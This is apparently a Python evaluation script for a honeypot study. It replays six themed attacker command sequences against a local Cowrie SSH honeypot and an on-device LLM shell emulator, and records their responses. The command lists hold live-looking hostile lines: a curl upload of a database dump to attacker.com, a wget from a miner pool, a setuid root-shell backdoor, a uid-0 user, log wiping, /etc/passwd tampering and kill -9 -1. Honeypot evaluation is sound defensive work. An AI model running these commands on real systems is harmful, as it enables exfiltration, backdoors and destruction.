"""
evaluation/eval_interaction.py
─────────────────────────────────────────────────────────────────
Hydra-Impact Evaluation Dataset (V0.2.0)
Sends themed attack sequences to both Cowrie and On-Device LLM.

Output structure:
  evaluation/interaction_results/
    theme1_crypto_jacker/
      cowrie.json
      ondevice.json
    ...

Run:
  cd evaluation
  python eval_interaction.py
─────────────────────────────────────────────────────────────────
"""

import sys
import os
import json
import time
import re
import paramiko
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from agent_manager.ondevice_agent import OnDeviceAgent
from prompt_manager import PromptManager
from fi_manager import FILogManager, FIScorer, MemoryPruner

# ─── Config ───────────────────────────────────────────────────────────────────

OUTPUT_DIR  = "/mnt/data-partition/honeypot/evaluation/interaction_results"
COWRIE_HOST = "127.0.0.1"
COWRIE_PORT = 2222
COWRIE_USER = "root"
COWRIE_PASS = "password"

os.makedirs(OUTPUT_DIR, exist_ok=True)

# ─── Hydra-Impact Dataset ─────────────────────────────────────────────────────

THEMES = [
    {
        "id":    "theme1_crypto_jacker",
        "title": "Theme 1: The Crypto-Jacker (Service Persistence)",
        "commands": [
            "cat /proc/cpuinfo",
            "mkdir /tmp/.ice-unix/.miner && cd /tmp/.ice-unix/.miner",
            "wget http://pool.miners.com/config.json -O config.json",
            'echo \'{"url": "stratum+tcp://monero.pool", "user": "hacker_id"}\' > config.json',
            "chmod +x config.json",
            "ls -la",
            "nohup ./miner --config config.json &",
            "ps aux | grep miner",
        ],
    },
    {
        "id":    "theme2_source_code_auditor",
        "title": "Theme 2: The Source Code Auditor (Compiler Chain)",
        "commands": [
            "which gcc",
            "cat <<EOF > backdoor.c",
            'void main(){ setuid(0); system("/bin/sh"); }',
            "EOF",
            "gcc backdoor.c -o .pam_auth",
            "rm backdoor.c",
            "ls",
            "./.pam_auth",
        ],
    },
    {
        "id":    "theme3_network_pivoter",
        "title": "Theme 3: The Network Pivoter (Tool Installation)",
        "commands": [
            "nmap --version",
            "apt-get install nmap -y",
            "nmap -sV 192.168.1.1",
            "alias scan='nmap -T4 -F'",
            "scan 127.0.0.1",
        ],
    },
    {
        "id":    "theme4_data_exfiltrator",
        "title": "Theme 4: The Data Exfiltrator (Database & Archiving)",
        "commands": [
            "mysqldump -u root -p password --all-databases > backup.sql",
            "ls -lh backup.sql",
            "tar -cvzf exfil.tar.gz backup.sql",
            "curl -F 'file=@exfil.tar.gz' http://attacker.com/upload",
            "rm backup.sql exfil.tar.gz",
            "history -c",
        ],
    },
    {
        "id":    "theme5_system_saboteur",
        "title": "Theme 5: The System Saboteur (Obfuscated Logic)",
        "commands": [
            'export CMD="cat /etc/shadow"',
            "echo $CMD | base64",
            '$(echo "Y2F0IC9ldGMvc2hhZG93" | base64 -d)',
            "touch /etc/ld.so.preload",
            "ls -l /etc/ld.so.preload",
            "chattr +i /etc/ld.so.preload",
            "rm /etc/ld.so.preload",
        ],
    },
    {
        "id":    "theme6_scorched_earth",
        "title": "Theme 6: The Scorched Earth (FI-4 Maximum Impact)",
        "commands": [
            "passwd root",
            "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
            "rm -rf /var/log/*",
            "chmod 777 /etc/passwd",
            "ls -la /etc/passwd",
            "echo 'root:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
            "cat /etc/passwd | tail -3",
            "kill -9 -1",
        ],
    },
]

# ─── Cowrie Session ───────────────────────────────────────────────────────────

class CowrieSession:
    def __init__(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.shell = None

    def connect(self):
        self.client.connect(COWRIE_HOST, port=COWRIE_PORT,
                            username=COWRIE_USER, password=COWRIE_PASS,
                            look_for_keys=False, allow_agent=False)
        self.shell = self.client.invoke_shell(term="xterm", width=220, height=50)
        time.sleep(0.5)
        if self.shell.recv_ready():
            self.shell.recv(9999)

    def send(self, cmd: str, timeout: float = 12.0) -> str:
        try:
            self.shell.send(cmd + "\n")
        except OSError:
            print("    [!] Cowrie socket closed — reconnecting...")
            self.connect()
            self.shell.send(cmd + "\n")
        time.sleep(0.3)
        deadline = time.time() + timeout
        buf = ""
        while time.time() < deadline:
            if self.shell.recv_ready():
                buf += self.shell.recv(9999).decode("utf-8", errors="replace")
                time.sleep(0.1)
            else:
                if buf:
                    break
                time.sleep(0.1)
        buf   = re.sub(r'\x1b\[[0-9;]*[mGKHF]', '', buf)
        lines = [l for l in buf.splitlines() if cmd not in l and "root@" not in l]
        return "\n".join(lines).strip()

    def disconnect(self):
        try:
            self.client.close()
        except Exception:
            pass

# ─── Helpers ──────────────────────────────────────────────────────────────────

def make_fresh_pm(system_state: dict) -> tuple:
    fi_scorer         = FIScorer()
    fi_manager        = FILogManager.__new__(FILogManager)
    fi_manager.scorer = fi_scorer
    fi_manager.pruner = MemoryPruner(max_events=10, min_fi=0)
    pm                = PromptManager(fi_manager, system_state)
    return fi_scorer, fi_manager, pm


def update_system_state(cmd: str, response: str, system_state: dict):
    """Mirror of main.py update_state but for eval — updates versions, installed, files."""

    # installs
    install_m = re.search(r'install\s+(\S+)', cmd)
    if install_m:
        pkg  = install_m.group(1)
        base = re.match(r'^([a-zA-Z]+)', pkg)
        ver  = re.search(r'(\d+\.\d+[\.\d]*)', pkg)
        if base and ver:
            system_state["versions"][base.group(1)] = ver.group(1)
        if pkg not in system_state["installed"]:
            system_state["installed"].append(pkg)

    # versions
    tool_m = re.match(r'^(\w+)\s+--version', cmd.strip())
    if tool_m:
        tool = tool_m.group(1)
        vm   = re.search(r'(\d+\.\d+[\.\d]*)', response)
        if tool not in system_state["versions"]:
            system_state["versions"][tool] = vm.group(1) if vm else "unknown"

    # file created via redirect, wget, touch, gcc
    redirect_m = re.search(r'>[ \t]*(\S+)[ \t]*$', cmd)
    wget_m     = re.search(r'wget\s+.*-O\s+(\S+)', cmd)
    touch_m    = re.match(r'touch\s+(\S+)', cmd.strip())
    gcc_m      = re.search(r'gcc\s+.*-o\s+(\S+)', cmd)
    created    = None
    if redirect_m: created = redirect_m.group(1)
    elif wget_m:   created = wget_m.group(1)
    elif touch_m:  created = touch_m.group(1)
    elif gcc_m:    created = gcc_m.group(1)
    if created and "error" not in response.lower() and "denied" not in response.lower():
        system_state["files"].setdefault(created, {"perms": "-rw-r--r--", "size": "1024"})

    # chmod
    chmod_m = re.match(r'chmod\s+(\S+)\s+(\S+)', cmd.strip())
    if chmod_m:
        mode, target = chmod_m.group(1), chmod_m.group(2)
        # only update if file actually exists in state
        if target in system_state["files"]:
            if "777" in mode:
                system_state["files"][target]["perms"] = "-rwxrwxrwx"
            elif "+x" in mode or "x" in mode:
                system_state["files"][target]["perms"] = "-rwxr-xr-x"
        # if file doesn't exist, state stays unchanged — LLM will see no entry = error is valid

    # rm
    rm_m = re.search(r'rm\s+(?:-\S+\s+)?(\S+)', cmd)
    if rm_m:
        system_state["files"].pop(rm_m.group(1), None)
    cd_m = re.search(r'(?:^|&&\s*)cd\s+(\S+)', cmd)
    if cd_m:
        system_state["cwd"] = cd_m.group(1)


def fresh_system_state() -> dict:
    return {
        "versions":  {},
        "installed": [],
        "cwd": "/root",          # ← add this
        "files": {
            "/etc/passwd": {"perms": "-rw-r--r--", "size": "2.1K"},
            "/etc/shadow": {"perms": "-rw-r-----", "size": "1.4K"},
            "/var/log":    {"perms": "drwxr-xr-x", "size": "4.0K"},
        }
    }

# ─── Run Themes ───────────────────────────────────────────────────────────────

SKIP_COWRIE = ["passwd", "kill -9 -1"]

def run_theme_cowrie(theme: dict, cowrie: CowrieSession) -> list:
    results = []
    print(f"\n  [Cowrie] {theme['title']}")
    for i, cmd in enumerate(theme["commands"], start=1):
        t0 = time.time()
        if any(cmd.startswith(x) for x in SKIP_COWRIE):
            response = "(skipped — interactive/destructive command)"
            latency  = 0.0
        else:
            response = cowrie.send(cmd)
            latency  = round((time.time() - t0) * 1000, 2)
        fi, _ = FIScorer().score(cmd)
        print(f"    ({i}/{len(theme['commands'])}) FI:{fi} | {latency}ms | $ {cmd[:60]}")
        results.append({
            "theme_id":   theme["id"],
            "index":      i,
            "cmd":        cmd,
            "response":   response,
            "fi":         fi,
            "latency_ms": latency,
        })
    return results


def run_theme_ondevice(theme: dict, agent: OnDeviceAgent) -> list:
    results      = []
    system_state = fresh_system_state()
    fi_scorer, fi_manager, pm = make_fresh_pm(system_state)

    print(f"\n  [On-Device] {theme['title']}")
    for i, cmd in enumerate(theme["commands"], start=1):
        sys_p, usr_p = pm.build_prompt(cmd)

        t0       = time.time()
        response = agent.send(sys_p, usr_p)
        latency  = round((time.time() - t0) * 1000, 2)

        fi, _ = fi_scorer.score(cmd)

        # feed into Hi buffer
        fi_manager.pruner.add({
            "session_id": theme["id"],
            "timestamp":  time.time(),
            "datetime":   datetime.now().isoformat(),
            "command":    cmd,
            "output":     response[:300],
            "agent":      "on_device",
            "fi":         fi,
        })

        # update SRi
        update_system_state(cmd, response, system_state)
        print(f"    [DEBUG files] {system_state['files']}")

        print(f"    ({i}/{len(theme['commands'])}) FI:{fi} | {latency}ms | $ {cmd[:60]}")
        results.append({
            "theme_id":   theme["id"],
            "index":      i,
            "cmd":        cmd,
            "response":   response,
            "fi":         fi,
            "latency_ms": latency,
            "prompt_usr": usr_p,
        })
    return results

# ─── Main ─────────────────────────────────────────────────────────────────────

def run():
    print("🚀 Hydra-Impact Evaluation — V0.1.0")
    print(f"   Themes: {len(THEMES)}")

    agent  = OnDeviceAgent()
    cowrie = CowrieSession()
    cowrie.connect()
    print("[✓] Cowrie connected")

    for theme in THEMES:
        theme_dir = os.path.join(OUTPUT_DIR, theme["id"])
        os.makedirs(theme_dir, exist_ok=True)

        print(f"\n{'─'*60}")
        print(f"  {theme['title']}")
        print(f"{'─'*60}")

        cowrie_results = run_theme_cowrie(theme, cowrie)
        with open(os.path.join(theme_dir, "cowrie.json"), "w") as f:
            json.dump(cowrie_results, f, indent=2)
        print(f"  [✓] Saved → {theme_dir}/cowrie.json")

        ondevice_results = run_theme_ondevice(theme, agent)
        with open(os.path.join(theme_dir, "ondevice.json"), "w") as f:
            json.dump(ondevice_results, f, indent=2)
        print(f"  [✓] Saved → {theme_dir}/ondevice.json")

    cowrie.disconnect()
    print(f"\n[✓] All themes complete → {OUTPUT_DIR}")

if __name__ == "__main__":
    run()